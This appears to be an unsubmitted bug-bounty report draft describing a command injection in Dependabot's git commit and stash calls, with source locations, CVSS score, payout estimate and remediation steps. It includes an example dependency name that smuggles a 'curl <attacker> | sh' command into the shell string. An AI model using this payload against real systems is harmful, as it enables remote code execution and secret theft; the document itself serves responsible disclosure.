# Dependabot Updater Command Injection via Dependency Name in Git Commit Message → RCE

**Program:** GitHub Bug Bounty (HackerOne) — public, paid. Critical payouts start at $10k+.
**In-scope asset:** Dependabot (github-owned application) — bounty.github.com/targets/dependabot.html
**Root language:** Ruby (dependabot-core)
**Submission status:** NOT submitted to GitHub/HackerOne. Candidate needs live reachability verification before submission. Do not submit without approval.

---

## Summary

An attacker-controlled dependency name is interpolated into a double-quoted shell string `git commit -m "#{msg}"` executed via `run_shell_command` with `allow_unsafe_shell_command: true` (raw `IO.popen`). The dependency name comes from a manifest key (npm/yarn dependencies key, pip requirement name, etc.) and `Dependency` has no name validation/sanitization. Reachable from grouped-update jobs. Result: remote code execution / arbitrary command execution in the Dependabot updater container — strictly more severe than VA-912's read-only arbitrary host file read.

---

## Affected

| Field | Value |
|---|---|
| Package / repo | dependabot-core |
| Version | v0.403.0 (current/latest release, created 2026-11-03) |
| Commit | cc2be3e976d5106b02a65b01d0d9bf3a0f7b6ed5 |
| Commit link | https://github.com/dependabot/dependabot-core/commit/cc2be3e976d5106b02a65b01d0d9bf3a0f7b6ed5 |
| Source | unmodified; nothing submitted |

---

## Root cause

`Workspace::Git#commit` (and `#stash`) builds a shell command by interpolating a memo string into `"git commit -m \"#{msg}\""` and executes it via `run_shell_command(..., allow_unsafe_shell_command: true)`, which forwards the string verbatim to `IO.popen`. Because the message is inside double quotes and the dependency name is not escaped, shell metacharacters break out of the quoted argument.

The memo originates from `group_update_creation.rb` line 744: `Dependabot::Workspace.store_change(memo: "Updating #{dependency.name}")`, plus the `stash(memo)` path at line 76. `dependency.name` is attacker-controlled (parsed from a manifest key) and `Dependency` (`common/lib/dependabot/dependency.rb`) performs no name validation or sanitization.

---

## Source locations

- `common/lib/dependabot/workspace/git.rb:133-137` — `git commit -m "#{msg}"` with `allow_unsafe_shell_command: true`
- `common/lib/dependabot/workspace/git.rb:119-123` — `git stash push --all -m "#{msg}"` same pattern (memo from `capture_failed_change_attempt`)
- `updater/lib/dependabot/updater/group_update_creation.rb:744` — memo `"Updating #{dependency.name}"` via `Workspace.store_change`
- `updater/lib/dependabot/updater/group_update_creation.rb:76` — `stash(memo)` path
- `common/lib/dependabot/command_helpers.rb:243` — `IO.popen` raw shell string when `allow_unsafe_shell_command: true`
- `common/lib/dependabot/dependency.rb` — no name validation/sanitization

Example injection: dependency name `foo" && curl -s <attacker> | sh && "` turns `git commit -m "Updating foo" && curl -s <attacker> | sh && ""` into arbitrary command execution in the updater process/container.

---

## Prerequisites

1. Grouped-update job configured (`groups:` in `dependabot.yml`) for an ecosystem whose parser passes dependency names verbatim (npm/yarn, pip, etc.).
2. `job.clone?` true and `DEPENDABOT_REPO_CONTENTS_PATH` set (same env gating as VA-912) so `prepare_workspace` activates the git workspace.
3. Malicious dependency is updated so `changes.any?` is true (guarded by `changed_files` at `workspace.rb:39`).

---

## Impact

- RCE / arbitrary command execution in updater container
- Code execution, file write, env/token exfiltration
- More severe than VA-912's read-only arbitrary host file read

---

## Limitations

- Reachability depends on grouped updates + workspace configuration + ecosystem parser not sanitizing name
- Requires attacker to control a dependency name in a manifest used by grouped updates
- Medium-high confidence (injection mechanics unambiguous; reachability gated)

---

## Novelty gate vs VA-912

- Distinct sink: shell execution vs `File.read`
- Distinct impact: RCE/write vs arbitrary host file read
- Distinct boundary: Workspace git layer vs file fetcher clone mode
- PASSES novelty gate — NOT a duplicate of VA-912

---

## CVSS estimate

**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**Score:** 9.1 Critical (estimate; final at GitHub's discretion)
**Justification:** AV:N — attacker supplies dependency name remotely via manifest; AC:L — no race conditions needed; PR:N — no privileges required; UI:N — no victim interaction; S:U — scope unchanged (updater container); C:H/I:H/A:H — RCE gives full read/write/execution in updater container.

---

## CWE

CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

---

## Payout range estimate

$5,000–$10,000+ (RCE in GitHub-owned Dependabot updater; GitHub pays $10k+ critical).

---

## Ready-to-paste private report draft

**Title:** Dependabot Updater Command Injection via Dependency Name in Git Commit Message → RCE

**Summary:** An attacker-controlled dependency name from a manifest (npm/yarn/pip, etc.) is interpolated into a double-quoted shell string `git commit -m "#{msg}"` executed via `run_shell_command` with `allow_unsafe_shell_command: true` (raw `IO.popen`). `Dependency` performs no name validation/sanitization. Reachable from grouped-update jobs, this yields remote code execution in the Dependabot updater container.

**Affected:** dependabot-core v0.403.0, commit cc2be3e976d5106b02a65b01d0d9bf3a0f7b6ed5

**Steps to reproduce (conceptual — needs live verification):**
1. Configure a Dependabot grouped-update job (`groups:` in dependabot.yml) for npm/yarn or pip.
2. Ensure `job.clone?` is true and `DEPENDABOT_REPO_CONTENTS_PATH` is set so `prepare_workspace` activates the git workspace.
3. Add a malicious dependency name containing shell metacharacters (e.g. `foo" && curl -s <attacker> | sh && "`) to the manifest.
4. Trigger the grouped update so the dependency is updated (`changes.any?` true).
5. `Workspace::Git#commit` / `#stash` executes `git commit -m "Updating <name>"` with the unescaped name, achieving command execution in the updater container.

**Expected:** Dependency name is treated as a literal string; git commit message contains only the name.
**Actual:** Shell metacharacters in the dependency name break out of the double-quoted shell string and execute arbitrary commands with `IO.popen`.

**Impact:** RCE / arbitrary command execution in updater container; code execution, file write, env/token exfiltration.

**CWE:** CWE-78

**CVSS:** 9.1 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Novelty note:** Distinct sink (shell execution vs VA-912's `File.read`), distinct impact (RCE/write vs arbitrary host file read), distinct boundary (Workspace git layer vs file fetcher clone mode). Not a duplicate of VA-912.

**Remediation:**
1. Escape/sanitize dependency name before interpolating into shell string (`Shellwords.escape` or equivalent).
2. Or avoid shell entirely: use Rugged or git library APIs instead of raw shell strings.
3. Add name validation on `Dependency` (reject shell metacharacters).
4. Set `allow_unsafe_shell_command: false` for `git commit`/`stash` calls.

**Evidence:** deep_dependabot_analysis.md (static analysis source)

---

*Submission status: NOT submitted. Candidate needs live reachability verification before submission. Do not submit without approval.*
